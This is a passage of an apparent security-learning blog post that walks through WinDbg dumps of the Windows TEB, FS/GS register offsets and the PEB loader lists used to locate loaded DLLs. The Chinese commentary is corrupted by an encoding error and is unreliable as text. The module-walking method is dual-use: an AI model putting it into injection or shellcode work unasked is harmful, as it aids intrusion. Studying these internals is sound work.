   <span class="token operator">+</span>0x1480 TlsSlots         : <span class="token punctuation">[</span>64<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x1680 TlsLinks         : _LIST_ENTRY
   <span class="token operator">+</span>0x1690 Vdm              : Ptr64 Void
   <span class="token operator">+</span>0x1698 ReservedForNtRpc : Ptr64 Void
   <span class="token operator">+</span>0x16a0 DbgSsReserved    : <span class="token punctuation">[</span>2<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x16b0 HardErrorMode    : Uint4B
   <span class="token operator">+</span>0x16b4 Padding4         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x16b8 Instrumentation  : <span class="token punctuation">[</span>11<span class="token punctuation">]</span> Ptr64 Void
   <span class="token operator">+</span>0x1710 ActivityId       : _GUID
   <span class="token operator">+</span>0x1720 SubProcessTag    : Ptr64 Void
   <span class="token operator">+</span>0x1728 PerflibData      : Ptr64 Void
   <span class="token operator">+</span>0x1730 EtwTraceData     : Ptr64 Void
   <span class="token operator">+</span>0x1738 WinSockData      : Ptr64 Void
   <span class="token operator">+</span>0x1740 GdiBatchCount    : Uint4B
   <span class="token operator">+</span>0x1744 CurrentIdealProcessor : _PROCESSOR_NUMBER
   <span class="token operator">+</span>0x1744 IdealProcessorValue : Uint4B
   <span class="token operator">+</span>0x1744 ReservedPad0     : UChar
   <span class="token operator">+</span>0x1745 ReservedPad1     : UChar
   <span class="token operator">+</span>0x1746 ReservedPad2     : UChar
   <span class="token operator">+</span>0x1747 IdealProcessor   : UChar
   <span class="token operator">+</span>0x1748 GuaranteedStackBytes : Uint4B
   <span class="token operator">+</span>0x174c Padding5         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x1750 ReservedForPerf  : Ptr64 Void
   <span class="token operator">+</span>0x1758 ReservedForOle   : Ptr64 Void
   <span class="token operator">+</span>0x1760 WaitingOnLoaderLock : Uint4B
   <span class="token operator">+</span>0x1764 Padding6         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x1768 SavedPriorityState : Ptr64 Void
   <span class="token operator">+</span>0x1770 ReservedForCodeCoverage : Uint8B
   <span class="token operator">+</span>0x1778 ThreadPoolData   : Ptr64 Void
   <span class="token operator">+</span>0x1780 TlsExpansionSlots : Ptr64 Ptr64 Void
   <span class="token operator">+</span>0x1788 ChpeV2CpuAreaInfo : Ptr64 _CHPEV2_CPUAREA_INFO
   <span class="token operator">+</span>0x1790 Unused           : Ptr64 Void
   <span class="token operator">+</span>0x1798 MuiGeneration    : Uint4B
   <span class="token operator">+</span>0x179c IsImpersonating  : Uint4B
   <span class="token operator">+</span>0x17a0 NlsCache         : Ptr64 Void
   <span class="token operator">+</span>0x17a8 pShimData        : Ptr64 Void
   <span class="token operator">+</span>0x17b0 HeapData         : Uint4B
   <span class="token operator">+</span>0x17b4 Padding7         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x17b8 CurrentTransactionHandle : Ptr64 Void
   <span class="token operator">+</span>0x17c0 ActiveFrame      : Ptr64 _TEB_ACTIVE_FRAME
   <span class="token operator">+</span>0x17c8 FlsData          : Ptr64 Void
   <span class="token operator">+</span>0x17d0 PreferredLanguages : Ptr64 Void
   <span class="token operator">+</span>0x17d8 UserPrefLanguages : Ptr64 Void
   <span class="token operator">+</span>0x17e0 MergedPrefLanguages : Ptr64 Void
   <span class="token operator">+</span>0x17e8 MuiImpersonation : Uint4B
   <span class="token operator">+</span>0x17ec CrossTebFlags    : Uint2B
   <span class="token operator">+</span>0x17ec SpareCrossTebBits : Pos 0<span class="token punctuation">,</span> 16 Bits
   <span class="token operator">+</span>0x17ee SameTebFlags     : Uint2B
   <span class="token operator">+</span>0x17ee SafeThunkCall    : Pos 0<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee InDebugPrint     : Pos 1<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee HasFiberData     : Pos 2<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee SkipThreadAttach : Pos 3<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee WerInShipAssertCode : Pos 4<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee RanProcessInit   : Pos 5<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee ClonedThread     : Pos 6<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee SuppressDebugMsg : Pos 7<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee DisableUserStackWalk : Pos 8<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee RtlExceptionAttached : Pos 9<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee InitialThread    : Pos 10<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee SessionAware     : Pos 11<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee LoadOwner        : Pos 12<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee LoaderWorker     : Pos 13<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee SkipLoaderInit   : Pos 14<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17ee SkipFileAPIBrokering : Pos 15<span class="token punctuation">,</span> 1 Bit
   <span class="token operator">+</span>0x17f0 TxnScopeEnterCallback : Ptr64 Void
   <span class="token operator">+</span>0x17f8 TxnScopeExitCallback : Ptr64 Void
   <span class="token operator">+</span>0x1800 TxnScopeContext  : Ptr64 Void
   <span class="token operator">+</span>0x1808 LockCount        : Uint4B
   <span class="token operator">+</span>0x180c WowTebOffset     : Int4B
   <span class="token operator">+</span>0x1810 ResourceRetValue : Ptr64 Void
   <span class="token operator">+</span>0x1818 ReservedForWdf   : Ptr64 Void
   <span class="token operator">+</span>0x1820 ReservedForCrt   : Uint8B
   <span class="token operator">+</span>0x1828 EffectiveContainerId : _GUID
   <span class="token operator">+</span>0x1838 LastSleepCounter : Uint8B
   <span class="token operator">+</span>0x1840 SpinCallCount    : Uint4B
   <span class="token operator">+</span>0x1844 Padding8         : <span class="token punctuation">[</span>4<span class="token punctuation">]</span> UChar
   <span class="token operator">+</span>0x1848 ExtendedFeatureDisableMask : Uint8B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="idt"><a href="#idt" class="headerlink" title="idt"></a>idt</h3><p>(my blog idt)[<a href="https://wr-web.github.io/2021/05/22/dll_injection_hook/#IDT-interrupt-descriptor-table]">https://wr-web.github.io/2021/05/22/dll_injection_hook/#IDT-interrupt-descriptor-table]</a></p>
<h3 id="ssdt"><a href="#ssdt" class="headerlink" title="ssdt"></a>ssdt</h3><p>(my blog ssdt)[<a href="https://wr-web.github.io/2021/05/22/dll_injection_hook/#SSDT-system-service-descriptor-table]">https://wr-web.github.io/2021/05/22/dll_injection_hook/#SSDT-system-service-descriptor-table]</a></p>
<h3 id="windows-fs-gs"><a href="#windows-fs-gs" class="headerlink" title="windows fs gs"></a>windows fs gs</h3><p><a href="https://en.wikipedia.org/wiki/Win32_Thread_Information_Block">wiki fs gs register</a></p>
<table>
<thead>
<tr>
<th>pointer</th>
<th>FS:[0x00]</th>
<th>GS:[0x00]</th>
<th><a href="https://en.wikipedia.org/wiki/Windows_9x">Win9x</a> and <a href="https://en.wikipedia.org/wiki/Windows_NT">NT</a></th>
<th>Current <a href="https://en.wikipedia.org/wiki/Structured_Exception_Handling">Structured Exception Handling</a> (SEH) frameNote: the 64-bit version of Windows uses <a href="https://en.wikipedia.org/wiki/Call_stack#Unwinding">stack unwinding</a> done in <a href="https://en.wikipedia.org/wiki/Protection_ring#Supervisor_mode">kernel mode</a> instead.</th>
</tr>
</thead>
<tbody><tr>
<td>pointer</td>
<td>FS:[0x18]</td>
<td>GS:[0x30]</td>
<td>Win9x and NT</td>
<td>Linear address of TEB</td>
</tr>
<tr>
<td>pointer</td>
<td>FS:[0x30]</td>
<td>GS:[0x60]</td>
<td>NT</td>
<td>Linear address of <a href="https://en.wikipedia.org/wiki/Process_Environment_Block">Process Environment Block</a> (PEB)</td>
</tr>
<tr>
<td>pointer</td>
<td>FS:[0xC0]</td>
<td>GS:[0x100]</td>
<td>NT</td>
<td>Reserved for Wow64. Contains a pointer to FastSysCall in Wow64.</td>
</tr>
</tbody></table>
<p>é€šè¿‡ fsï¼Œgs å¯„å­˜å™¨å‡ ä¹å¯ä»¥å¾—åˆ°è¿›ç¨‹ï¼Œçº¿ç¨‹çš„å¤§éƒ¨åˆ†ä¿¡æ¯ï¼Œé€šè¿‡ pebï¼Œteb</p>
<h4 id="åˆ©ç”¨-gs-è·å–åŠ è½½çš„-dll-åç§°ï¼Œåœ°å€ç­‰ã€‚"><a href="#åˆ©ç”¨-gs-è·å–åŠ è½½çš„-dll-åç§°ï¼Œåœ°å€ç­‰ã€‚" class="headerlink" title="åˆ©ç”¨ gs è·å–åŠ è½½çš„ dll åç§°ï¼Œåœ°å€ç­‰ã€‚"></a>åˆ©ç”¨ gs è·å–åŠ è½½çš„ dll åç§°ï¼Œåœ°å€ç­‰ã€‚</h4><p>è¯»å– gs[0x60] ä¸Šçš„ peb åœ°å€ï¼Œå†é€šè¿‡ peb-&gt;Ldr</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_PEB_LDR_DATA</span>
<span class="token punctuation">&#123;</span>
ã€€ULONG Length<span class="token punctuation">;</span> <span class="token comment">// +0x00</span>
ã€€BOOLEAN Initialized<span class="token punctuation">;</span> <span class="token comment">// +0x04</span>
ã€€PVOID SsHandle<span class="token punctuation">;</span> <span class="token comment">// +0x08</span>
ã€€LIST_ENTRY InLoadOrderModuleList<span class="token punctuation">;</span> <span class="token comment">// +0x0c</span>
ã€€LIST_ENTRY InMemoryOrderModuleList<span class="token punctuation">;</span> <span class="token comment">// +0x14</span>
ã€€LIST_ENTRY InInitializationOrderModuleList<span class="token punctuation">;</span><span class="token comment">// +0x1c</span>
<span class="token punctuation">&#125;</span> PEB_LDR_DATA<span class="token punctuation">,</span><span class="token operator">*</span>PPEB_LDR_DATA<span class="token punctuation">;</span> <span class="token comment">// +0x24</span>

<span class="token comment">// å’Œ linux ä¸­çš„åŒå‘é“¾è¡¨ä½¿ç”¨æ–¹æ³•ä¸€æ ·</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> <span class="token operator">*</span>Flink<span class="token punctuation">;</span>
   <span class="token keyword">struct</span> <span class="token class-name">_LIST_ENTRY</span> <span class="token operator">*</span>Blink<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> LIST_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span>PLIST_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span>RESTRICTED_POINTER PRLIST_ENTRY<span class="token punctuation">;</span>

<span class="token number">0</span><span class="token operator">:</span><span class="token number">000</span><span class="token operator">></span> dt _LDR_DATA_TABLE_ENTRY
ntdll<span class="token operator">!</span>_LDR_DATA_TABLE_ENTRY
   <span class="token operator">+</span><span class="token number">0x000</span> InLoadOrderLinks <span class="token operator">:</span> _LIST_ENTRY
   <span class="token operator">+</span><span class="token number">0x010</span> InMemoryOrderLinks <span class="token operator">:</span> _LIST_ENTRY
   <span class="token operator">+</span><span class="token number">0x020</span> InInitializationOrderLinks <span class="token operator">:</span> _LIST_ENTRY
   <span class="token operator">+</span><span class="token number">0x030</span> DllBase          <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x038</span> EntryPoint       <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x040</span> SizeOfImage      <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x048</span> FullDllName      <span class="token operator">:</span> _UNICODE_STRING
   <span class="token operator">+</span><span class="token number">0x058</span> BaseDllName      <span class="token operator">:</span> _UNICODE_STRING
   <span class="token operator">+</span><span class="token number">0x068</span> FlagGroup        <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> UChar
   <span class="token operator">+</span><span class="token number">0x068</span> Flags            <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x068</span> PackagedBinary   <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> MarkedForRemoval <span class="token operator">:</span> Pos <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ImageDll         <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> LoadNotificationsSent <span class="token operator">:</span> Pos <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> TelemetryEntryProcessed <span class="token operator">:</span> Pos <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ProcessStaticImport <span class="token operator">:</span> Pos <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> InLegacyLists    <span class="token operator">:</span> Pos <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> InIndexes        <span class="token operator">:</span> Pos <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ShimDll          <span class="token operator">:</span> Pos <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> InExceptionTable <span class="token operator">:</span> Pos <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ReservedFlags1   <span class="token operator">:</span> Pos <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span> Bits
   <span class="token operator">+</span><span class="token number">0x068</span> LoadInProgress   <span class="token operator">:</span> Pos <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> LoadConfigProcessed <span class="token operator">:</span> Pos <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> EntryProcessed   <span class="token operator">:</span> Pos <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ProtectDelayLoad <span class="token operator">:</span> Pos <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ReservedFlags3   <span class="token operator">:</span> Pos <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">2</span> Bits
   <span class="token operator">+</span><span class="token number">0x068</span> DontCallForThreads <span class="token operator">:</span> Pos <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ProcessAttachCalled <span class="token operator">:</span> Pos <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ProcessAttachFailed <span class="token operator">:</span> Pos <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> CorDeferredValidate <span class="token operator">:</span> Pos <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> CorImage         <span class="token operator">:</span> Pos <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> DontRelocate     <span class="token operator">:</span> Pos <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> CorILOnly        <span class="token operator">:</span> Pos <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ChpeImage        <span class="token operator">:</span> Pos <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ChpeEmulatorImage <span class="token operator">:</span> Pos <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ReservedFlags5   <span class="token operator">:</span> Pos <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> Redirected       <span class="token operator">:</span> Pos <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x068</span> ReservedFlags6   <span class="token operator">:</span> Pos <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">2</span> Bits
   <span class="token operator">+</span><span class="token number">0x068</span> CompatDatabaseProcessed <span class="token operator">:</span> Pos <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit
   <span class="token operator">+</span><span class="token number">0x06c</span> ObsoleteLoadCount <span class="token operator">:</span> Uint2B
   <span class="token operator">+</span><span class="token number">0x06e</span> TlsIndex         <span class="token operator">:</span> Uint2B
   <span class="token operator">+</span><span class="token number">0x070</span> HashLinks        <span class="token operator">:</span> _LIST_ENTRY
   <span class="token operator">+</span><span class="token number">0x080</span> TimeDateStamp    <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x088</span> EntryPointActivationContext <span class="token operator">:</span> Ptr64 _ACTIVATION_CONTEXT
   <span class="token operator">+</span><span class="token number">0x090</span> Lock             <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x098</span> DdagNode         <span class="token operator">:</span> Ptr64 _LDR_DDAG_NODE
   <span class="token operator">+</span><span class="token number">0x0a0</span> NodeModuleLink   <span class="token operator">:</span> _LIST_ENTRY
   <span class="token operator">+</span><span class="token number">0x0b0</span> LoadContext      <span class="token operator">:</span> Ptr64 _LDRP_LOAD_CONTEXT
   <span class="token operator">+</span><span class="token number">0x0b8</span> ParentDllBase    <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x0c0</span> SwitchBackContext <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x0c8</span> BaseAddressIndexNode <span class="token operator">:</span> _RTL_BALANCED_NODE
   <span class="token operator">+</span><span class="token number">0x0e0</span> MappingInfoIndexNode <span class="token operator">:</span> _RTL_BALANCED_NODE
   <span class="token operator">+</span><span class="token number">0x0f8</span> OriginalBase     <span class="token operator">:</span> Uint8B
   <span class="token operator">+</span><span class="token number">0x100</span> LoadTime         <span class="token operator">:</span> _LARGE_INTEGER
   <span class="token operator">+</span><span class="token number">0x108</span> BaseNameHashValue <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x10c</span> LoadReason       <span class="token operator">:</span> _LDR_DLL_LOAD_REASON
   <span class="token operator">+</span><span class="token number">0x110</span> ImplicitPathOptions <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x114</span> ReferenceCount   <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x118</span> DependentLoadFlags <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x11c</span> SigningLevel     <span class="token operator">:</span> UChar
   <span class="token operator">+</span><span class="token number">0x120</span> CheckSum         <span class="token operator">:</span> Uint4B
   <span class="token operator">+</span><span class="token number">0x128</span> ActivePatchImageBase <span class="token operator">:</span> Ptr64 Void
   <span class="token operator">+</span><span class="token number">0x130</span> HotPatchState    <span class="token operator">:</span> _LDR_HOT_PATCH_STATE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">0:000&gt; !peb
PEB at 00000044333bb000
    InheritedAddressSpace:    No
    ReadImageFileExecOptions: No
    BeingDebugged:            Yes
    ImageBaseAddress:         00007ff7fdf00000
    NtGlobalFlag:             70
    NtGlobalFlag2:            0
    Ldr                       00007ffdb725a120
    Ldr.Initialized:          Yes
    Ldr.InInitializationOrderModuleList: 00000205cd2b3f90 . 00000205cd2b4860
    Ldr.InLoadOrderModuleList:           00000205cd2b4160 . 00000205cd2b6c60
    Ldr.InMemoryOrderModuleList:         00000205cd2b4170 . 00000205cd2b6c70
                    Base TimeStamp                     Module
            7ff7fdf00000 622895d5 Mar 09 19:56:05 2022 C:\Users\orz10\ROOT\security\learn\start\a.exe
            7ffdb70e0000 931cda92 Mar 18 18:55:14 2048 C:\Windows\SYSTEM32\ntdll.dll
            7ffdb6bc0000 7b65e245 Aug 09 20:17:09 2035 C:\Windows\System32\KERNEL32.DLL
            7ffdb48d0000 71a5cb5d Jun 03 12:21:49 2030 C:\Windows\System32\KERNELBASE.dll
            7ffdb6a70000 90483ed2 Sep 16 03:49:38 2046 C:\Windows\System32\msvcrt.dll


0:000&gt; dt _PEB_LDR_DATA 00007ffdb725a120
ntdll!_PEB_LDR_DATA
   +0x000 Length           : 0x58
   +0x004 Initialized      : 0x1 &#39;&#39;
   +0x008 SsHandle         : (null) 
   +0x010 InLoadOrderModuleList : _LIST_ENTRY [ 0x00000205&#96;cd2b4160 - 0x00000205&#96;cd2b6c60 ]
   +0x020 InMemoryOrderModuleList : _LIST_ENTRY [ 0x00000205&#96;cd2b4170 - 0x00000205&#96;cd2b6c70 ]
   +0x030 InInitializationOrderModuleList : _LIST_ENTRY [ 0x00000205&#96;cd2b3f90 - 0x00000205&#96;cd2b4860 ]
   +0x040 EntryInProgress  : (null) 
   +0x048 ShutdownInProgress : 0 &#39;&#39;
   +0x050 ShutdownThreadId : (null) 
    
# æŸ¥çœ‹ InLoadOrderModuleList çš„ç¬¬ä¸€é¡¹

0:000&gt; dq 00007ffdb725a130
00007ffd&#96;b725a130  00000205&#96;cd2b4160 00000205&#96;cd2b6c60
00007ffd&#96;b725a140  00000205&#96;cd2b4170 00000205&#96;cd2b6c70
00007ffd&#96;b725a150  00000205&#96;cd2b3f90 00000205&#96;cd2b4860
00007ffd&#96;b725a160  00000000&#96;00000000 00000000&#96;00000000
00007ffd&#96;b725a170  00000000&#96;00000000 00000000&#96;00000001
00007ffd&#96;b725a180  00000205&#96;cd2b0000 00000000&#96;00000000
00007ffd&#96;b725a190  00000000&#96;00000000 00000000&#96;00000000
00007ffd&#96;b725a1a0  00000000&#96;00000000 00000000&#96;00000000

# InLoadOrderModuleList é“¾è¡¨èŠ‚ç‚¹
# 0x00000205&#96;cd2b4160 0x00000205&#96;cd2b3f70
# 0x00000205&#96;cd2b4840 0x00000205&#96;cd2b4f70 
# 0x00000205&#96;cd2b6c60 0x00007ffd&#96;b725a130 
# 0x00000205&#96;cd2b4160

# ç¬¬ä¸€ä¸ªåŠ è½½çš„æ˜¯ a.exe

0:000&gt; dt _LDR_DATA_TABLE_ENTRY 00000205&#96;cd2b4160
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b3f70 - 0x00007ffd&#96;b725a130 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b3f80 - 0x00007ffd&#96;b725a140 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000000&#96;00000000 - 0x00000000&#96;00000000 ]
   +0x030 DllBase          : 0x00007ff7&#96;fdf00000 Void
   +0x038 EntryPoint       : 0x00007ff7&#96;fdf014d0 Void
   +0x040 SizeOfImage      : 0x42000
   +0x048 FullDllName      : _UNICODE_STRING &quot;C:\Users\orz10\ROOT\security\learn\start\a.exe&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;a.exe&quot;
   +0x068 FlagGroup        : [4]  &quot;???&quot;
   +0x068 Flags            : 0x22cc
   +0x068 PackagedBinary   : 0y0

# ç¬¬äºŒä¸ªæ˜¯ ntdll.dll

0:000&gt; dt _LDR_DATA_TABLE_ENTRY 0x00000205&#96;cd2b3f70
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4840 - 0x00000205&#96;cd2b4160 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4850 - 0x00000205&#96;cd2b4170 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4f90 - 0x00007ffd&#96;b725a150 ]
   +0x030 DllBase          : 0x00007ffd&#96;b70e0000 Void
   +0x038 EntryPoint       : (null) 
   +0x040 SizeOfImage      : 0x209000
   +0x048 FullDllName      : _UNICODE_STRING &quot;C:\Windows\SYSTEM32\ntdll.dll&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;ntdll.dll&quot;
   +0x068 FlagGroup        : [4]  &quot;???&quot;

# ç¬¬ä¸‰ä¸ª KERNEL32.DLL

0:000&gt; dt _LDR_DATA_TABLE_ENTRY 0x00000205&#96;cd2b4840
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4f70 - 0x00000205&#96;cd2b3f70 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4f80 - 0x00000205&#96;cd2b3f80 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00007ffd&#96;b725a150 - 0x00000205&#96;cd2b4f90 ]
   +0x030 DllBase          : 0x00007ffd&#96;b6bc0000 Void
   +0x038 EntryPoint       : 0x00007ffd&#96;b6bd5580 Void
   +0x040 SizeOfImage      : 0xbd000
   +0x048 FullDllName      : _UNICODE_STRING &quot;C:\Windows\System32\KERNEL32.DLL&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;KERNEL32.DLL&quot;
   +0x068 FlagGroup        : [4]  &quot;???&quot;
   
# ç¬¬å››ä¸ª KERNELBASE.dll

0:000&gt; dt _LDR_DATA_TABLE_ENTRY 0x00000205&#96;cd2b4f70
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b6c60 - 0x00000205&#96;cd2b4840 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b6c70 - 0x00000205&#96;cd2b4850 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4860 - 0x00000205&#96;cd2b3f90 ]
   +0x030 DllBase          : 0x00007ffd&#96;b48d0000 Void
   +0x038 EntryPoint       : 0x00007ffd&#96;b48f4620 Void
   +0x040 SizeOfImage      : 0x374000
   +0x048 FullDllName      : _UNICODE_STRING &quot;C:\Windows\System32\KERNELBASE.dll&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;KERNELBASE.dll&quot;
   
# ç¬¬äº”ä¸ª msvcrt.dll
   
0:000&gt; dt _LDR_DATA_TABLE_ENTRY 0x00000205&#96;cd2b6c60
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00007ffd&#96;b725a130 - 0x00000205&#96;cd2b4f70 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00007ffd&#96;b725a140 - 0x00000205&#96;cd2b4f80 ]
